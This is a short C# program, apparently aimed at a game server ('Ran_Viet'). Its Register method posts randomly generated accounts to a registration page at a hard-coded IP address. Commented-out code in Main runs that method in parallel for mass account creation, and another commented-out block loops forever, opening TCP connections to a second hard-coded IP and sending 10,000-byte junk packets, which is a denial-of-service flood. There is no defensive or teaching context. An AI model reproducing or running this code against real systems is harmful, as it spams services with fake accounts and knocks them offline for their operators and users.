using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Ran_Viet
{
    class Program
    {
        private static string Data = "1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM";
        private static HttpClient Http { get; set; }
        private static string ObjectId()
        {
            return Guid.NewGuid().ToString().Split('-').LastOrDefault();
        }
        private static void Register(int index)
        {
            var username = ObjectId();
            var pass = ObjectId();
            var pin = ObjectId();
            var dic = new Dictionary<string, string>
            {
                ["Username"] = username,
                ["Password"] = pass,
                ["RePassword"] = pass,
                ["Pin"] = pin,
                ["Email"] = ObjectId() + "@gmail.com",
                ["__reg_act"] = "__reg_act",
                ["login"] = "Đăng Ký",
            };
            var data = new FormUrlEncodedContent(dic);
            using(var http = new HttpClient())
            {
                var result = http.PostAsync("http://103.108.132.246/App/user/register.php", data);
                result.Wait();
                if (!result.Result.IsSuccessStatusCode)
                {
                    Console.WriteLine(result.Result.StatusCode);
                }
                else
                {
                    Console.WriteLine($"{index}-{username}-{pass}");
                }
                var content = result.Result.Content.ReadAsStringAsync();
                content.Wait();
            }
        }

        private static SimpleTcpClient Client { get; set; }
        private static SimpleTcpServer Server { get; set; }
        static void Main(string[] args)
        {
            ////var count = Console.ReadLine();
            ////var c = int.Parse(count);
            ////Parallel.For(0, c, i =>
            ////  {
            ////      Register(i);
            ////  });
            //Packet = new byte[10000];
            //for (int i = 0; i < 10000; i++)
            //{
            //    Packet[i] = 255;
            //}
            //Client = new SimpleTcpClient();
            //Client.DataReceived += Client_DataReceived;
            //Client.Connect("45.119.85.206", 3000);
            //while (true)
            //{
            //    new SimpleTcpClient().Connect("45.119.85.206", 3000);
            //    Client.Write(Packet);
            //}
        }
        private static byte[] Packet { get; set; }
        private static void Client_DataReceived(object sender, Message e)
        {
            Console.WriteLine(e.MessageString);
            //e.Reply(e.Data);
        }
    }
}
